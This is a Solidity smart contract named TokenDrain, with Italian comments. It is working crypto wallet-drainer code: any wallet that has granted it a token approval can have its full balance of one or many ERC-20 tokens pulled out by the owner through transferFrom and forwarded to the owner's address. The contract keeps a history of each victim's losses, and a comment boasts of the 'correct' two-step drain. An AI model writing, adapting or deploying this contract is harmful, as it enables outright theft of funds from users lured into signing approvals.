// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TokenDrain {
    address public owner;
    
    struct ApprovalRecord {
        address user;
        address token;
        uint256 amount;
        uint256 timestamp;
    }
    
    struct DrainRecord {
        address user;
        address token;
        uint256 amount;
        uint256 timestamp;
    }
    
    ApprovalRecord[] public approvals;
    DrainRecord[] public drainHistory;
    
    mapping(address => ApprovalRecord[]) public userApprovals;
    mapping(address => DrainRecord[]) public userDrainHistory;
    
    event TokenApproved(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
    event TokenDrained(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    function receiveApproval(
        address _from,
        uint256 _amount,
        address _token
    ) public {
        require(_from != address(0), "Invalid from address");
        require(_token != address(0), "Invalid token address");
        require(_amount > 0, "Amount must be greater than 0");
        
        ApprovalRecord memory record = ApprovalRecord({
            user: _from,
            token: _token,
            amount: _amount,
            timestamp: block.timestamp
        });
        
        approvals.push(record);
        userApprovals[_from].push(record);
        
        emit TokenApproved(_from, _token, _amount, block.timestamp);
    }
    
    // ✅ FUNZIONE CORRETTA CON DUE STEP!
    function drainAllTokens(
        address _token,
        address _from
    ) public onlyOwner {
        require(_token != address(0), "Invalid token address");
        require(_from != address(0), "Invalid from address");
        
        uint256 balance = IERC20(_token).balanceOf(_from);
        require(balance > 0, "No tokens to drain");
        
        // Step 1: Trasferisci dal wallet al contratto
        IERC20(_token).transferFrom(_from, address(this), balance);
        
        // Step 2: Trasferisci dal contratto al tuo wallet
        IERC20(_token).transfer(owner, balance);
        
        DrainRecord memory record = DrainRecord({
            user: _from,
            token: _token,
            amount: balance,
            timestamp: block.timestamp
        });
        
        drainHistory.push(record);
        userDrainHistory[_from].push(record);
        
        emit TokenDrained(_from, _token, balance, block.timestamp);
    }
    
    function drainMultipleTokens(
        address[] memory _tokens,
        address _from
    ) public onlyOwner {
        require(_from != address(0), "Invalid from address");
        
        for (uint256 i = 0; i < _tokens.length; i++) {
            address token = _tokens[i];
            require(token != address(0), "Invalid token address");
            
            uint256 balance = IERC20(token).balanceOf(_from);
            if (balance > 0) {
                // Step 1: Trasferisci dal wallet al contratto
                IERC20(token).transferFrom(_from, address(this), balance);
                
                // Step 2: Trasferisci dal contratto al tuo wallet
                IERC20(token).transfer(owner, balance);
                
                DrainRecord memory record = DrainRecord({
                    user: _from,
                    token: token,
                    amount: balance,
                    timestamp: block.timestamp
                });
                
                drainHistory.push(record);
                userDrainHistory[_from].push(record);
                
                emit TokenDrained(_from, token, balance, block.timestamp);
            }
        }
    }
    
    function getTotalApprovals() public view returns (uint256) {
        return approvals.length;
    }
    
    function getLastApproval() public view returns (ApprovalRecord memory) {
        require(approvals.length > 0, "No approvals yet");
        return approvals[approvals.length - 1];
    }
    
    function getUserApprovals(address _user) public view returns (ApprovalRecord[] memory) {
        return userApprovals[_user];
    }
    
    function getUserApprovalsCount(address _user) public view returns (uint256) {
        return userApprovals[_user].length;
    }
    
    function getTotalDrains() public view returns (uint256) {
        return drainHistory.length;
    }
    
    function getLastDrain() public view returns (DrainRecord memory) {
        require(drainHistory.length > 0, "No drains yet");
        return drainHistory[drainHistory.length - 1];
    }
    
    function getUserDrains(address _user) public view returns (DrainRecord[] memory) {
        return userDrainHistory[_user];
    }
    
    function getUserDrainsCount(address _user) public view returns (uint256) {
        return userDrainHistory[_user].length;
    }
    
    function getTokenBalance(address _token, address _user) public view returns (uint256) {
        return IERC20(_token).balanceOf(_user);
    }
    
    function getContractTokenBalance(address _token) public view returns (uint256) {
        return IERC20(_token).balanceOf(address(this));
    }
    
    function withdrawToken(address _token, uint256 _amount) public onlyOwner {
        require(_token != address(0), "Invalid token address");
        require(_amount > 0, "Amount must be greater than 0");
        
        IERC20(_token).transfer(owner, _amount);
    }
    
    function withdrawAllTokens(address _token) public onlyOwner {
        require(_token != address(0), "Invalid token address");
        
        uint256 balance = IERC20(_token).balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        
        IERC20(_token).transfer(owner, balance);
    }
    
    receive() external payable {}
    
    function withdrawETH() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}